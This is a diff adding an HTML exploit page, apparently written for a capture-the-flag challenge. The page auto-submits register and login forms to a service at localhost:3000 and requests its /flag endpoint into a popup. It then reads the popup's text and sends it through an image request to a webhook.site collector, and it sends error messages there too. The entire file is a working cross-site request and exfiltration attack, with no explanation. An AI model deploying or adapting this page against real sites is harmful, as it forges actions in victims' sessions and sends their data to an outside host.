@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<body>
+<form id="regForm" method="POST" action="http://localhost:3000/register" target="popup">
+  <input name="username" value="poptest">
+  <input name="password" value="poptest">
+</form>
+
+<form id="loginForm" method="POST" action="http://localhost:3000/login" target="popup">
+  <input name="username" value="poptest">
+  <input name="password" value="poptest">
+</form>
+
+<form id="flagForm" method="GET" action="http://localhost:3000/flag" target="popup">
+</form>
+
+<script>
+// 먼저 팝업 열기
+var popup = window.open('about:blank', 'popup');
+
+// register
+document.getElementById('regForm').submit();
+
+setTimeout(function(){
+  // login
+  document.getElementById('loginForm').submit();
+}, 200);
+
+setTimeout(function(){
+  // flag
+  document.getElementById('flagForm').submit();
+}, 500);
+
+setTimeout(function(){
+  try {
+    var c = popup.document.body.innerText;
+    new Image().src = 'https://webhook.site/showontest?flag=' + encodeURIComponent(c);
+  } catch(e) {
+    new Image().src = 'https://webhook.site/showontest?err=' + encodeURIComponent(e.message);
+  }
+}, 800);
+</script>
+</body>
+</html>
